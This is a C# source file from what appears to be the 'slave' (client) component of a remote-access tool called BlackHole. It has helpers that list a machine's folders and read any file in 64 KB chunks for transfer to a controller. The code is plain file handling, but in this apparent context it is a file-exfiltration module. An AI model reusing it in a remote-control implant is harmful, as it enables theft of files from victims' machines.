using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class FileHelper : Singleton<FileHelper>
    {
        /// <summary>
        /// Chunck to download
        /// </summary>
        public const int FILE_PART_SIZE = 64 * 1000;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public DownloadedFilePartMessage DownloadFilePart(int id, int currentPart, string path)
        {
            path = Path.GetFullPath(path);

            using (var stream = new FileStream(path, FileMode.Open))
            {
                int totalPart = (int)stream.Length / FILE_PART_SIZE;

                var partSize = currentPart != totalPart ? FILE_PART_SIZE : stream.Length - (FILE_PART_SIZE * currentPart);
                // read only one chunck
                var output = new byte[partSize];
                stream.Seek(FILE_PART_SIZE * currentPart, SeekOrigin.Begin);
                stream.Read(output, 0, (int)partSize);
                
                return new DownloadedFilePartMessage()
                {
                    Id = id,
                    CurrentPart = currentPart,
                    Path = path,
                    TotalPart = totalPart,
                    RawPart = output
                };
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public FolderNavigationMessage NavigateToFolder(string path)
        {
            // transform relative to absolute
            path = Path.GetFullPath(path);

            var files = new List<FileMeta>()
            {
                new FileMeta()
                {
                    Type = FileType.FOLDER,
                    Name = "..",
                    Size = "0"
                }
            };
            // append directories
            files
                .AddRange(Directory
                                .GetDirectories(path)
                                .Select(name => new DirectoryInfo(name))
                                .Select(info => new FileMeta()
                                {
                                    Type = FileType.FOLDER,
                                    Name = info.Name + "\\",
                                    Size = "0"
                                }));
            // append files
            files
                .AddRange(Directory
                                .GetFiles(path)
                                .Select(name => new FileInfo(name))
                                .Select(info => new FileMeta()
                                {
                                    Type = FileType.FILE,
                                    Name = info.Name,
                                    Size = FormatFileSize(info.Length)
                                }));

            return new FolderNavigationMessage()
            {
                Path = path,
                Files = files
            };
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="length"></param>
        private string FormatFileSize(double length)
        {
            int order = 0;
            string[] sizes = { "B", "KB", "MB", "GB" };
            while (length >= 1024 && order + 1 < sizes.Length)
            {
                order++;
                length = length / 1024;
            }
            return string.Format("{0:0.##} {1}", length, sizes[order]);
        }
    }
}
